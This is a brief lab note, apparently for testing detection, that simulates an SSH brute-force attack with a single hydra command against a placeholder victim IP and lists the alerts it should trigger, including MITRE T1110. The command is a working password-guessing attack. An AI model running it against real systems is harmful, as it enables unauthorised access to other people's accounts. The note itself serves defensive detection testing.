# SSH Brute Force Simulation

Run only inside your own lab.

```bash
hydra -l testuser -P passwords.txt ssh://<victim-ip>
```

Expected detection:

- SSH Brute Force
- MITRE T1110
- Multiple failed SSH connections to port 22
